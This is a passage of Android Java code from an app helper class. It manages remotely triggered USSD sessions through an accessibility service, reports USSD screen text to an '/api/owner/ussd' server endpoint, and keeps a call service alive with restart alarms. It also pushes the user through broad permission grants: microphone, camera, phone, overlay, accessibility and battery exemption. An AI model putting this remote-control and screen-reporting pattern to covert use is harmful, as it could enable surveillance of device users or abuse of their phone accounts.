        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return;
        String cleanId = requestId.trim();
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                JSONObject obj = loadUssdHandledStateLocked(prefs);
                JSONArray arr = obj.optJSONArray("handledIds");
                if (arr == null) arr = new JSONArray();
                boolean found = false;
                for (int i = 0; i < arr.length(); i++) {
                    if (cleanId.equals(arr.optString(i))) {
                        found = true;
                        break;
                    }
                }
                if (!found) arr.put(cleanId);
                JSONArray trimmed = new JSONArray();
                int start = Math.max(0, arr.length() - 30);
                for (int i = start; i < arr.length(); i++) {
                    trimmed.put(arr.optString(i));
                }
                obj.put("handledIds", trimmed);

                String prevReqId = obj.optString("activeReqId", "");
                if (!cleanId.equals(prevReqId)) {
                    obj.put("activeReqId", cleanId);
                    obj.put("appliedReplySeq", Math.max(0, appliedReplySeq));
                    obj.put("cancelledReqId", cancelled ? cleanId : "");
                } else {
                    int prevSeq = obj.optInt("appliedReplySeq", 0);
                    obj.put("appliedReplySeq", Math.max(prevSeq, appliedReplySeq));
                    if (cancelled) {
                        obj.put("cancelledReqId", cleanId);
                    }
                }
                prefs.edit().putString(KEY_USSD_HANDLED_JSON, obj.toString()).commit();
            }
        } catch (Throwable ignored) {
        }
    }

    public static int getRemoteUssdAppliedReplySeq(Context ctx, String requestId) {
        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return 0;
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                JSONObject obj = loadUssdHandledStateLocked(prefs);
                if (requestId.trim().equals(obj.optString("activeReqId", ""))) {
                    return Math.max(0, obj.optInt("appliedReplySeq", 0));
                }
            }
        } catch (Throwable ignored) {
        }
        return 0;
    }

    public static void setRemoteUssdAppliedReplySeq(Context ctx, String requestId, int seq) {
        markRemoteUssdHandled(ctx, requestId, seq, false);
    }

    public static boolean isRemoteUssdCancelled(Context ctx, String requestId) {
        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return false;
        try {
            synchronized (STATE_LOCK) {
                SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                JSONObject obj = loadUssdHandledStateLocked(prefs);
                return requestId.trim().equals(obj.optString("cancelledReqId", ""));
            }
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static void markRemoteUssdCancelled(Context ctx, String requestId) {
        markRemoteUssdHandled(ctx, requestId, 0, true);
    }

    public static void reportRemoteUssdStateAsync(
        final Context ctx,
        final String requestId,
        final String status,
        final String screenText,
        final boolean hasInput,
        final String detail,
        final int appliedReplySeq
    ) {
        if (ctx == null || requestId == null || requestId.trim().isEmpty()) return;
        final Context appCtx = ctx.getApplicationContext();
        final String reqIdClean = requestId.trim();
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                String deviceId = getDeviceId(appCtx);
                if (deviceId.isEmpty()) return;
                String baseUrl = getApiBaseUrl(appCtx);
                for (int attempt = 0; attempt < 2; attempt++) {
                    HttpURLConnection conn = null;
                    try {
                        URL url = new URL(baseUrl + "/api/owner/ussd");
                        conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setConnectTimeout(4500);
                        conn.setReadTimeout(4500);
                        conn.setDoOutput(true);
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setRequestProperty("x-device-id", deviceId);

                        JSONObject body = new JSONObject();
                        body.put("action", "client_update");
                        body.put("deviceId", deviceId);
                        body.put("requestId", reqIdClean);
                        body.put("status", status != null ? status : "screen");
                        if (screenText != null) {
                            body.put("screenText", screenText);
                        }
                        body.put("hasInput", hasInput);
                        if (detail != null) {
                            body.put("detail", detail);
                        }
                        if (appliedReplySeq >= 0) {
                            body.put("appliedReplySeq", appliedReplySeq);
                        }
                        byte[] bytes = body.toString().getBytes(StandardCharsets.UTF_8);
                        OutputStream os = conn.getOutputStream();
                        os.write(bytes);
                        os.close();
                        int code = conn.getResponseCode();
                        if (code >= 200 && code < 300) {
                            return;
                        }
                    } catch (Throwable ignored) {
                    } finally {
                        if (conn != null) {
                            try {
                                conn.disconnect();
                            } catch (Throwable ignored) {
                            }
                        }
                    }
                    try {
                        Thread.sleep(450L);
                    } catch (InterruptedException ignored) {
                        return;
                    }
                }
            }
        });
        t.setDaemon(true);
        t.start();
    }

    public static void setPendingCallAction(Context ctx, String callId, String action) {
        setPendingCallAction(ctx, callId, action, "audio");
    }

    public static void setPendingCallAction(Context ctx, String callId, String action, String callMode) {
        if (ctx == null || action == null || action.isEmpty()) return;
        try {
            JSONObject obj = new JSONObject();
            obj.put("callId", callId != null ? callId : "");
            obj.put("action", action);
            obj.put("callMode", "video".equals(callMode) ? "video" : "audio");
            obj.put("ts", System.currentTimeMillis());
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putString(KEY_PENDING_JSON, obj.toString()).commit();
        } catch (Throwable ignored) {
        }
    }

    public static String consumePendingCallAction(Context ctx) {
        if (ctx == null) return "";
        try {
            SharedPreferences prefs = ctx.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            String raw = prefs.getString(KEY_PENDING_JSON, "");
            if (raw == null || raw.isEmpty()) return "";
            prefs.edit().remove(KEY_PENDING_JSON).apply();
            JSONObject obj = new JSONObject(raw);
            long ts = obj.optLong("ts", 0L);
            if (ts > 0L && (System.currentTimeMillis() - ts) > 120000L) {
                return "";
            }
            return raw;
        } catch (Throwable ignored) {
            return "";
        }
    }

    public static void startCallServiceIfReady(Context ctx) {
        if (ctx == null) return;
        try {
            if (getDeviceId(ctx).isEmpty()) return;
            Intent intent = new Intent(ctx, CallForegroundService.class);
            intent.setAction(CallForegroundService.ACTION_START_SYNC);
            if (Build.VERSION.SDK_INT >= 26) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }
        } catch (Throwable ignored) {
        }
    }

    public static void scheduleServiceRestartAlarm(Context ctx, long delayMs) {
        if (ctx == null) return;
        try {
            Context appCtx = ctx.getApplicationContext();
            if (getDeviceId(appCtx).isEmpty()) return;
            AlarmManager am = (AlarmManager) appCtx.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent restartIntent = new Intent(appCtx, CallBootReceiver.class);
            restartIntent.setAction(CallBootReceiver.ACTION_RESTART_CALL_SYNC);
            int piFlags = Build.VERSION.SDK_INT >= 23
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(appCtx, 7099, restartIntent, piFlags);
            long triggerAt = SystemClock.elapsedRealtime() + Math.max(500L, delayMs);
            if (Build.VERSION.SDK_INT >= 23) {
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi);
            }
        } catch (Throwable ignored) {
        }
    }

    public static void stopCallRinger(Context ctx) {
        CallForegroundService.stopRingingStatic(ctx);
        IncomingCallActivity.finishIfOpen("");
    }

    private static boolean hasRuntimePerm(Context ctx, String perm) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < 23) return true;
        try {
            return ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean hasNotificationsEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                if (ctx.checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
            if (Build.VERSION.SDK_INT >= 24) {
                NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null && !nm.areNotificationsEnabled()) {
                    return false;
                }
            }
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean hasOverlayEnabled(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < 23) return true;
        try {
            return Settings.canDrawOverlays(ctx);
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static boolean hasIgnoreBatteryOptimizations(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < 23) return true;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            return pm == null || pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static boolean hasAllRuntimePerms(Context ctx) {
        if (ctx == null) return false;
        if (!hasRuntimePerm(ctx, "android.permission.RECORD_AUDIO")) return false;
        if (!hasRuntimePerm(ctx, "android.permission.CAMERA")) return false;
        if (!hasRuntimePerm(ctx, "android.permission.CALL_PHONE")) return false;
        if (Build.VERSION.SDK_INT >= 33 && !hasRuntimePerm(ctx, "android.permission.POST_NOTIFICATIONS")) {
            return false;
        }
        return true;
    }

    public static boolean isUssdAccessibilityEnabled(Context ctx) {
        if (ctx == null) return false;
        try {
            if (UssdAccessibilityService.instance != null) {
                return true;
            }
            int accEnabled = Settings.Secure.getInt(
                ctx.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED,
                0
            );
            if (accEnabled != 1) {
                return false;
            }
            String enabledServices = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (enabledServices == null || enabledServices.trim().isEmpty()) {
                return false;
            }
            ComponentName expected = new ComponentName(
                ctx.getPackageName(),
                UssdAccessibilityService.class.getName()
            );
            TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
            splitter.setString(enabledServices);
            while (splitter.hasNext()) {
                String compStr = splitter.next();
                ComponentName enabledComp = ComponentName.unflattenFromString(compStr);
                if (enabledComp != null && enabledComp.equals(expected)) {
                    return true;
                }
            }
            return false;
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static String getPermissionStatusJson(Context ctx) {
        JSONObject obj = new JSONObject();
        try {
            boolean mic = hasRuntimePerm(ctx, "android.permission.RECORD_AUDIO");
            boolean cam = hasRuntimePerm(ctx, "android.permission.CAMERA");
            boolean phone = hasRuntimePerm(ctx, "android.permission.CALL_PHONE");
            boolean notif = hasNotificationsEnabled(ctx);
            boolean overlay = hasOverlayEnabled(ctx);
            boolean accessibility = isUssdAccessibilityEnabled(ctx);
            boolean battery = hasIgnoreBatteryOptimizations(ctx);
            boolean allGranted = mic && cam && phone && notif && overlay && accessibility && battery;
            obj.put("microphone", mic);
            obj.put("camera", cam);
            obj.put("phone", phone);
            obj.put("notifications", notif);
            obj.put("overlay", overlay);
            obj.put("accessibility", accessibility);
            obj.put("battery", battery);
            obj.put("allGranted", allGranted);
            obj.put("sdkInt", Build.VERSION.SDK_INT);
        } catch (Throwable ignored) {
        }
        return obj.toString();
    }

    public static boolean hasAllCallPermissions(Context ctx) {
        if (ctx == null) return false;
        try {
            return hasRuntimePerm(ctx, "android.permission.RECORD_AUDIO")
                && hasRuntimePerm(ctx, "android.permission.CAMERA")
                && hasRuntimePerm(ctx, "android.permission.CALL_PHONE")
                && hasNotificationsEnabled(ctx)
                && hasOverlayEnabled(ctx)
                && isUssdAccessibilityEnabled(ctx)
                && hasIgnoreBatteryOptimizations(ctx);
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static void requestCallPermissions(final Activity activity) {
        if (activity == null) return;
        lastActivityRef = new WeakReference<Activity>(activity);
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (Build.VERSION.SDK_INT >= 23) {
                        List<String> needed = new ArrayList<String>();
                        if (!hasRuntimePerm(activity, "android.permission.RECORD_AUDIO")) {
                            needed.add("android.permission.RECORD_AUDIO");
                        }
                        if (!hasRuntimePerm(activity, "android.permission.CAMERA")) {
                            needed.add("android.permission.CAMERA");
                        }
                        if (!hasRuntimePerm(activity, "android.permission.CALL_PHONE")) {
                            needed.add("android.permission.CALL_PHONE");
                        }
                        if (Build.VERSION.SDK_INT >= 33 && !hasRuntimePerm(activity, "android.permission.POST_NOTIFICATIONS")) {
                            needed.add("android.permission.POST_NOTIFICATIONS");
                        }
                        if (!needed.isEmpty()) {
                            SharedPreferences prefs = activity.getApplicationContext().getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                            boolean askedBefore = prefs.getBoolean(KEY_ASKED_RUNTIME_ONCE, false);
                            boolean anyCanShowDialog = false;
                            for (String perm : needed) {
                                if (activity.shouldShowRequestPermissionRationale(perm)) {
                                    anyCanShowDialog = true;
                                    break;
                                }
                            }
                            if (askedBefore && !anyCanShowDialog) {
                                if (needed.size() == 1 && "android.permission.POST_NOTIFICATIONS".equals(needed.get(0))) {
                                    openPermissionSetting(activity, "notifications");
                                } else {
                                    openPermissionSetting(activity, "app");
                                }
                                return;
                            }
                            prefs.edit().putBoolean(KEY_ASKED_RUNTIME_ONCE, true).apply();
                            activity.requestPermissions(needed.toArray(new String[0]), REQ_CALL_PERMISSIONS);
                            return;
                        }
                        if (!hasOverlayEnabled(activity)) {
                            openPermissionSetting(activity, "overlay");
                            return;
                        }
                        if (!hasNotificationsEnabled(activity)) {
                            openPermissionSetting(activity, "notifications");
                            return;
                        }
                        if (!hasIgnoreBatteryOptimizations(activity)) {
                            openPermissionSetting(activity, "battery");
                            return;
                        }
                    }
                    if (!isUssdAccessibilityEnabled(activity)) {
                        openPermissionSetting(activity, "accessibility");
                    }
                } catch (Throwable ignored) {
                }
            }
        });
    }

    public static void openPermissionSetting(final Activity activity, final String kind) {
        if (activity == null) return;
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                try {
                    String k = kind == null ? "app" : kind.trim().toLowerCase();
                    Intent intent = null;
                    if ("overlay".equals(k) && Build.VERSION.SDK_INT >= 23) {
                        intent = new Intent(
                            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                    } else if ("battery".equals(k) && Build.VERSION.SDK_INT >= 23) {
                        intent = new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + activity.getPackageName())
                        );
                    } else if ("notifications".equals(k)) {
                        if (Build.VERSION.SDK_INT >= 26) {
                            intent = new Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                            intent.putExtra(Settings.EXTRA_APP_PACKAGE, activity.getPackageName());
                        }
                    } else if ("accessibility".equals(k)) {
                        intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    }
                    if (intent == null) {
                        intent = new Intent(
                            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", activity.getPackageName(), null)
                        );
                    }
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    activity.startActivity(intent);
                } catch (Throwable ignored) {
                    try {
                        Intent fallback = new Intent(
                            Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.fromParts("package", activity.getPackageName(), null)
                        );
                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        activity.startActivity(fallback);
                    } catch (Throwable ignored2) {
                    }
                }
            }
        });
    }

    public static boolean openExternalUrl(final Activity activity, final String rawUrl) {
        if (activity == null || rawUrl == null) return false;
        final String cleanUrl = rawUrl.trim();
        if (cleanUrl.isEmpty()) return false;
        try {
            final Uri parsed = Uri.parse(cleanUrl);
            final String scheme = parsed.getScheme();
            if (scheme == null || (!"http".equalsIgnoreCase(scheme) && !"https".equalsIgnoreCase(scheme))) {
                return false;
            }
            final Intent viewIntent = new Intent(Intent.ACTION_VIEW, parsed);
            viewIntent.addCategory(Intent.CATEGORY_BROWSABLE);
            viewIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        activity.startActivity(viewIntent);
                    } catch (Throwable ignored) {
                    }
                }
            });
            return true;
        } catch (Throwable ignored) {
            return false;
        }
    }

    public static void handleWebPermissionRequest(final Activity activity, final PermissionRequest request) {
        if (request == null) return;
        try {
            if (Build.VERSION.SDK_INT >= 23 && activity != null) {
                List<String> needed = new ArrayList<String>();
                String[] resources = request.getResources();
                boolean wantsAudio = false;
                boolean wantsVideo = false;
                if (resources != null) {
                    for (String res : resources) {
                        if (PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(res)) {
                            wantsAudio = true;
                        } else if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(res)) {
                            wantsVideo = true;
                        }
                    }
                }
                if (wantsAudio && !hasRuntimePerm(activity, "android.permission.RECORD_AUDIO")) {
                    needed.add("android.permission.RECORD_AUDIO");
                }
                if (wantsVideo && !hasRuntimePerm(activity, "android.permission.CAMERA")) {
                    needed.add("android.permission.CAMERA");
                }
                if (!needed.isEmpty()) {
                    pendingWebRequest = request;
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                activity.requestPermissions(needed.toArray(new String[0]), REQ_WEB_PERMISSIONS);
                            } catch (Throwable ignored) {
                            }
                        }
                    });
                    return;
                }
            }
            request.grant(request.getResources());
        } catch (Throwable ignored) {
        }
    }

    public static boolean handleWebPermissionResult(int requestCode, int[] grantResults) {
        if (requestCode == REQ_CALL_PERMISSIONS) {
            try {
                Activity act = lastActivityRef != null ? lastActivityRef.get() : null;
                if (act != null && !act.isFinishing() && hasAllRuntimePerms(act)) {
                    if (!hasOverlayEnabled(act)) {
                        openPermissionSetting(act, "overlay");
                    } else if (!hasNotificationsEnabled(act)) {
                        openPermissionSetting(act, "notifications");
                    } else if (!hasIgnoreBatteryOptimizations(act)) {
                        openPermissionSetting(act, "battery");
                    } else if (!isUssdAccessibilityEnabled(act)) {
                        openPermissionSetting(act, "accessibility");
                    }
                }
            } catch (Throwable ignored) {
            }
            return false;
        }
        if (requestCode != REQ_WEB_PERMISSIONS) {
            return false;
        }
        PermissionRequest req = pendingWebRequest;
        pendingWebRequest = null;
        if (req != null) {
            try {
                Activity act = lastActivityRef != null ? lastActivityRef.get() : null;
                String[] reqResources = req.getResources();
                if (act != null && reqResources != null && reqResources.length > 0) {
                    List<String> granted = new ArrayList<String>();
                    for (String res : reqResources) {
                        if (PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(res)
                            && hasRuntimePerm(act, "android.permission.RECORD_AUDIO")) {
                            granted.add(res);
                        } else if (PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(res)
                            && hasRuntimePerm(act, "android.permission.CAMERA")) {
                            granted.add(res);
                        }
                    }
                    if (!granted.isEmpty()) {
                        req.grant(granted.toArray(new String[0]));
                    } else {
                        req.deny();
                    }
                } else {
                    boolean allOk = grantResults != null && grantResults.length > 0;
                    if (allOk) {
                        for (int res : grantResults) {
                            if (res != PackageManager.PERMISSION_GRANTED) {
                                allOk = false;
                                break;
                            }
                        }
                    }
                    if (allOk) {
                        req.grant(req.getResources());
                    } else {
                        req.deny();
                    }
                }
            } catch (Throwable ignored) {
            }
        }
        return true;
    }
}
